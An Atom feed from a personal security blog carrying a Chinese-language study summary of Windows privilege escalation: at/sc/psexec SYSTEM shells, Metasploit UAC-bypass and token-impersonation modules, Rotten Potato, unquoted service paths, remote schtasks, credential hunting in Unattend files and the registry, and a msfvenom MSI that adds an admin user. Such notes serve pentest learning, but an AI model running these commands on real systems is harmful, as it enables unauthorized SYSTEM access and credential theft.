<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://demoyao100.github.io</id>
    <title>Moyao の小屋 • Posts by &#34;pentesting&#34; tag</title>
    <link href="https://demoyao100.github.io" />
    <updated>2024-05-12T09:27:14.000Z</updated>
    <category term="re" />
    <category term="Android" />
    <category term="codeforces" />
    <category term="开发" />
    <category term="cv" />
    <category term="驱动" />
    <category term="electron" />
    <category term="docker" />
    <category term="杂文" />
    <category term="ios" />
    <category term="IOT" />
    <category term="web" />
    <category term="re Android linux" />
    <category term="web shiro" />
    <category term="jail" />
    <category term="wasm" />
    <category term="python" />
    <category term="hexo" />
    <category term="pentesting" />
    <category term="tree" />
    <category term="car" />
    <entry>
        <id>https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
        <title>渗透提权总结</title>
        <link rel="alternate" href="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
        <content type="html">&lt;p&gt;PREFACE：这个是真不太会，赶紧学学…&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h2 id=&#34;一-windows&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-windows&#34;&gt;#&lt;/a&gt; 一、windows&lt;/h2&gt;
&lt;h3 id=&#34;1-windows权限分级&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-windows权限分级&#34;&gt;#&lt;/a&gt; 1 windows 权限分级&lt;/h3&gt;
&lt;p&gt;1.user：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员操作修改操作系统的设置或用户资料）&lt;/p&gt;
&lt;p&gt;2.Administrator： 管理员权限。可以利用 windows 的机制将自己提升为 system 权限，以便操作 SAm 文件&lt;/p&gt;
&lt;p&gt;3.System： 系统权限。可以对 sam 等敏感文件进行读取，往往需要将 administrator 权限提升到 system 权限才可以对散列值进行 DUmp 操作&lt;/p&gt;
&lt;p&gt;4.TrustedInstaller：window 中的最高权限，对系统文件，即将拥有 system 权限也无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等&lt;/p&gt;
&lt;h3 id=&#34;2-流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-流程&#34;&gt;#&lt;/a&gt; 2 流程&lt;/h3&gt;
&lt;p&gt;检查用户&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whoami/groups&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查看目标机器补丁&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;systeminfo
wmic qfe get Caption,Description ,HotFixID,InstalledOn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;msf 渗透扫描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;post/windows/gather/enum_patches
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-at命令利用-windows2000-windows-2003-windows-xp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-at命令利用-windows2000-windows-2003-windows-xp&#34;&gt;#&lt;/a&gt; 3 at 命令利用 Windows2000、Windows 2003、Windows XP&lt;/h3&gt;
&lt;p&gt;​		在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用 at 命令将权限提升至 system 权限。&lt;/p&gt;
&lt;p&gt;AT 命令是 Windows XP 中内置的命令，它也可以媲美 Windows 中的 &amp;quot;计划任务&amp;quot;，而且在计划的安排、任务的管理、工作事务的处理方面，AT 命令具有更强大更神通的功能。AT 命令可在指定时间和日期、在指定计算机上运行命令和程序。&lt;/p&gt;
&lt;p&gt;因为 at 命令默认是以 system 权限下运行的所以我们可以利用以下命令，进行提权。&lt;/p&gt;
&lt;p&gt;at 时间 /interactive cmd 其中里面的 /interactive 参数是开启交互模式&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165344444-1263387316.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165345724-1823083219.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到已经启动了一个 system 权限下的 cmd 窗口，虽然此时我们已经有了 system 的权限，但是可以看到，桌面还是之前用户的权限所启动的&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346188-456697944.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;为了完全提权，我们可以在 system 的 cmd 里面输入 taskmgr.exe 来启动任务管理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346621-908976883.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在任务管理器里面我们结束掉之前由之前账号开启的桌面进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347188-2031860445.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后再添加一个由 system 权限下开启的桌面进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347529-1439309872.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;再点入看现在登入的账号是&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348118-1951026428.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者利用 msf 生成木马在利用 at 启动&lt;/p&gt;
&lt;h3 id=&#34;4-sc命令利用-windows-78-0308-1216&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-sc命令利用-windows-78-0308-1216&#34;&gt;#&lt;/a&gt; 4 sc 命令利用 windows 7/8、03/08、12/16&lt;/h3&gt;
&lt;p&gt;适用于 windows 7/8、03/08、12/16&lt;/p&gt;
&lt;p&gt;因为 at 命令在 win7，win8 等更高版本的系统上都已经取消掉了，所以在一些更高版本的 windows 操作系统上我们可以用 sc 命令进行提权&lt;/p&gt;
&lt;p&gt;SC 命令是 XP 系统中功能强大的 DOS 命令，SC 命令能与 &amp;quot;服务控制器&amp;quot; 和已安装设备进行通讯。SC 是用于与服务控制管理器和服务进行通信的命令行程序。&lt;/p&gt;
&lt;p&gt;通俗理解就是 sc 可以启动一个服务，命令如下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sc Create systemcmd binPath= &amp;quot;cmd /K start&amp;quot; type= own type= interact
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 systemcmd 是服务名称，大家可以随意填写，binpath 是启动的命令，type=own 是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的 cmd 窗口，如图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348548-2040451659.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们继续回车&lt;/p&gt;
&lt;p&gt;上面的命令。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348917-255228848.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sc start systemcmd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349331-1015014567.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为 sc 启动服务也是默认 system 权限的，所以我们启动的 cmd 窗口也是 system 权限！接下来的操作就可以和 xp，2003 一样了，这里就不在重复了。&lt;/p&gt;
&lt;h3 id=&#34;5-psexec提权-win2003-win2008&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-psexec提权-win2003-win2008&#34;&gt;#&lt;/a&gt; 5 psexec 提权 Win2003、Win2008&lt;/h3&gt;
&lt;p&gt;适用版本：Win2003 &amp;amp; Win2008&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;psexec.exe -accepteula -s -i -d cmd.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;开启的 cmd 窗口也是 system 权限&lt;/p&gt;
&lt;h3 id=&#34;6-绕过uac提权-microsoft的windows-vista-windows-server-2008&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-绕过uac提权-microsoft的windows-vista-windows-server-2008&#34;&gt;#&lt;/a&gt; 6 绕过 UAC 提权 Microsoft 的 Windows Vista、Windows Server 2008&lt;/h3&gt;
&lt;h5 id=&#34;1简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1简介&#34;&gt;#&lt;/a&gt; （1）简介&lt;/h5&gt;
&lt;p&gt;​		Microsoft 的 Windows Vista 和 Windows Server 2008 操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。&lt;/p&gt;
&lt;p&gt;​		换句话说，它是 Windows 的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC 确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且 Windows 系统保持不变。&lt;/p&gt;
&lt;p&gt;​		UAC 通过阻止程序执行任何涉及有关系统更改 / 特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被 &amp;quot;提升权限&amp;quot;，而不是以管理员身份运行的程序。&lt;/p&gt;
&lt;p&gt;​		UAC 不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。&lt;/p&gt;
&lt;h5 id=&#34;2绕过方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2绕过方法&#34;&gt;#&lt;/a&gt; （2）绕过方法&lt;/h5&gt;
&lt;p&gt;通过 msf 拿到 meterprter 的会话后，我们可以通过 getsystem 或者 getuid 来检查是否是 system 权限&lt;/p&gt;
&lt;p&gt;如果不是 system 权限，我们可以通过以下绕过 UAC 模块对 UAC 进行绕过，在通过 getsystem 进行提权&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_comhijack
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-令牌窃取-2008及以前&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-令牌窃取-2008及以前&#34;&gt;#&lt;/a&gt; 7 令牌窃取 2008 及以前&lt;/h3&gt;
&lt;h5 id=&#34;令牌简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#令牌简介&#34;&gt;#&lt;/a&gt; 令牌简介&lt;/h5&gt;
&lt;p&gt;​		描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个 Access Token，这个 Token 在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了 A 用户创建一个进程而该进程没有 B 用户的权限。一般用户双击运行一个进程都会拷贝 explorer.exe 的 Access Token。访问令牌分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;两种 token 只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。&lt;/p&gt;
&lt;p&gt;​		同样也可以这样理解，当前系统中的某个进程或线程能访问到什么样的系统资源，完全取决于你当前进程是拿着谁的令牌。&lt;/p&gt;
&lt;p&gt;​		默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前 shell 的访问级别，如果当前的 shell 是 administrator 或者是 system，我们就可以看到系统中的所有的令牌。&lt;/p&gt;
&lt;h5 id=&#34;攻击方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击方法&#34;&gt;#&lt;/a&gt; 攻击方法&lt;/h5&gt;
&lt;p&gt;首先提前获取一个 session&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; use incognito

meterpreter &amp;gt; list_tokens -u

meterpreter &amp;gt; impersonate_token WIN-2HU3N1\\Administrator **#注意：这里是两个反斜杠\\**
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8-烂土豆提权-web权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-烂土豆提权-web权限&#34;&gt;#&lt;/a&gt; 8 烂土豆提权 web 权限&lt;/h3&gt;
&lt;h4 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;欺骗 &amp;quot;NT AUTHORITY\SYSTEM&amp;quot; 账户通过 NTLM 认证到我们控制的 TCP 终端。&lt;/li&gt;
&lt;li&gt;对这个认证过程使用中间人攻击（NTLM 重放），为 &amp;quot;NT AUTHORITY\SYSTEM&amp;quot; 账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API 调用实现的。&lt;/li&gt;
&lt;li&gt;模仿这个令牌。只有具有 &amp;quot;模仿安全令牌权限&amp;quot; 的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL 等）有这个权限，大多数用户级的账户没有这个权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​		所以，一般从 web 拿到的 webshell 都是 IIS 服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹 meterpreter 然后再去执行 EXP 的时候会失败，但使用菜刀（IIS 服务器权限）反弹 meterpreter 就会成功。&lt;/p&gt;
&lt;h4 id=&#34;攻击方法-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击方法-2&#34;&gt;#&lt;/a&gt; 攻击方法&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; upload /root/Rottenpotato/rottenpotato.exe

meterpreter &amp;gt; execute -HC -f rottenpotato.exe

meterpreter &amp;gt; use incognito

meterpreter &amp;gt; list_tokens -u
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;会发现令牌列表里面存在 system 的令牌，在用 system 的令牌进行提权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;烂土豆版本&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe&#34;&gt;https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe&#34;&gt;https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/foxglovesec/RottenPotato&#34;&gt;https://github.com/foxglovesec/RottenPotato&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;9-可信任服务路径漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9-可信任服务路径漏洞&#34;&gt;#&lt;/a&gt; 9 可信任服务路径漏洞&lt;/h3&gt;
&lt;p&gt;如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里假设有一个服务路径 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;带引号时：&amp;quot;C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe&amp;quot; 会被看成一个完整的服务路径，故不会产生漏洞。&lt;/li&gt;
&lt;li&gt;不带引号时：我们认为的服务路径是 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows 会认为 C:\Program 空格后面的为 Program 这个程序的参数来进行启动服务。这样攻击者就可以命名一个为 Program.exe 的后门文件放在 c 盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;攻击方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;#寻找存在漏洞的服务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wmic service get name,displayname,pathname,startmode | findstr /i &amp;quot;Auto&amp;quot; | findstr /i /v &amp;quot;C:\Windows\\&amp;quot; | findstr /i /v &amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;把我们后门文件重命名放在对应的文件路径下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 msf 上进行监听，然后启动对应服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;接收到 shell，且是 system 权限&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;msf 检测攻击模块&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exploit/windows/local/unquoted_service_path
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set AutoRunScript migrate -f
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;10-不安全服务权限配合计划任务schtasks或sc命令利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10-不安全服务权限配合计划任务schtasks或sc命令利用&#34;&gt;#&lt;/a&gt; 10 不安全服务权限配合计划任务 schtasks 或 SC 命令利用&lt;/h3&gt;
&lt;p&gt;​		如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来 administrator 提权到 system，因为普通用户用 sc 修改服务路径会没有权限，导致不能用该方法提权。）&lt;/p&gt;
&lt;p&gt;accesschk.exe -uwcqv “administrators” * #检查 administrators 组的权限配置（这里自己创建了一个 test 服务）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;sc config “test” binpath=“C:\shell.exe” #用 sc 命令修改服务对应路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;sc start test #然后我们在 msf 监听，在启动该服务，就可以接收到我们的 shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然还可以用 schtasks 来定时启动服务，schtasks 命令比 at 命令更灵活。而且在 Windows Vista、Windows Server 2008 及之后版本的操作系统已经弃用 at 命令。&lt;/p&gt;
&lt;p&gt;#查看计算机的计划任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;schtasks /query /fo LIST /v
schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在远程主机运行 &amp;quot;test&amp;quot; 任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;schtasks /run /s 10.10.10.80 /i /tn &amp;quot;test&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行完成之后就删除计划任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;schtasks /delete /s 10.10.10.80 /tn &amp;quot;test&amp;quot; /f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着删除 IPC&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net use \\10.10.10.80 /del /y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在使用 schtasks 命令的时候会在系统留下日志文件 C:WindowsTasksSchedLgU.txt。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参数：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/create 表示创建计划任务

/tn 表示任务名

/tr 指定运行的文件

/sc 是任务运行频率

/st 是执行时间

/s 指定远程机器名或 ip 地址

/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM

/i 表示立即运行

/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告

/delete 是删除任务。
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;10-unattended-installs自动安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10-unattended-installs自动安装&#34;&gt;#&lt;/a&gt; 10 Unattended Installs（自动安装）&lt;/h3&gt;
&lt;p&gt;自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为 Unattend 的 XML 文件残存在系统上。 这个 XML 文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。&lt;/p&gt;
&lt;p&gt;全盘搜索 Unattend 文件是个好办法，它通常会在以下一个文件夹中：&lt;/p&gt;
&lt;p&gt;Copy&lt;/p&gt;
&lt;p&gt;C:\Windows\Panther&lt;br&gt;
C:\Windows\Panther\Unattend&lt;br&gt;
C:\Windows\System32&lt;br&gt;
C:\Windows\System32\sysprep\&lt;/p&gt;
&lt;p&gt;除了 Unattend.xml 文件外，还要留意系统中的 sysprep.xml 和 sysprep.inf 文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。&lt;/p&gt;
&lt;p&gt;Copy&lt;/p&gt;
&lt;p&gt;C:\Users\user\Desktop&amp;gt; dir C:*vnc.ini /s /b /c&lt;/p&gt;
&lt;p&gt;Copy&lt;/p&gt;
&lt;p&gt;#或者在名称中包含关键词的项目：&lt;br&gt;
C:\Users\user\Desktop&amp;gt; dir C:\ /s /b /c | findstr /sr &lt;em&gt;password&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;#或者可以在文件内容中搜索 password 之类的关键字：&lt;br&gt;
C:\Users\user\Desktop&amp;gt;findstr /si password *.txt | *.xml | *.ini&lt;/p&gt;
&lt;p&gt;#可以查询注册表，例如，字符串 password：&lt;br&gt;
reg query HKLM /f password /t REG_SZ /s&lt;br&gt;
reg query HKCU /f password /t REG_SZ /s&lt;/p&gt;
&lt;p&gt;在这些文件中通常包含用户名和密码，密码使用 base64 编码，并且在最后会附加 &amp;quot;Password&amp;quot;，所以真正的密 码需要去掉最后的 &amp;quot;Password&amp;quot;。&lt;/p&gt;
&lt;p&gt;#msf 模块&lt;br&gt;
 post/windows/gather/enum_unattend&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417102207151-1260539331.png&#34;&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;11-alwaysinstallelevated&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11-alwaysinstallelevated&#34;&gt;#&lt;/a&gt; 11 AlwaysInstallElevated&lt;/h3&gt;
&lt;p&gt;AlwaysInstallElevated 是一种允许非管理用户以 SYSTEM 权限运行 Microsoft Windows 安装程序包（.MSI 文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。&lt;/p&gt;
&lt;p&gt;可以通过查询以下注册表项来识别此设置：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &amp;quot;AlwaysInstallElevated&amp;quot;=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &amp;quot;AlwaysInstallElevated&amp;quot;=dword:00000001
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 reg query 命令查询是否存在漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:&amp;gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
or
C:&amp;gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果系统没这个漏洞，它将输出错误:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ERROR: The system was unable to find the specified registry key or value.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果存在漏洞，上面将输出以下内容:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417101457457-373225001.png&#34;&gt;&lt;img src=&#34;/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后我们使用 msfvenom 生成 msi 文件，进行提权&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi

msiexec /quiet /qn /i C:\programdata\rotten.msi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;# /quiet 安装过程中禁止向用户发送消息&lt;br&gt;
# /qn 不使用 GUI&lt;br&gt;
# /i 安装程序&lt;/p&gt;
&lt;p&gt;msf 下的自动模块&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exploit/windows/local/always_install_elevated
&lt;/code&gt;&lt;/pre&gt;
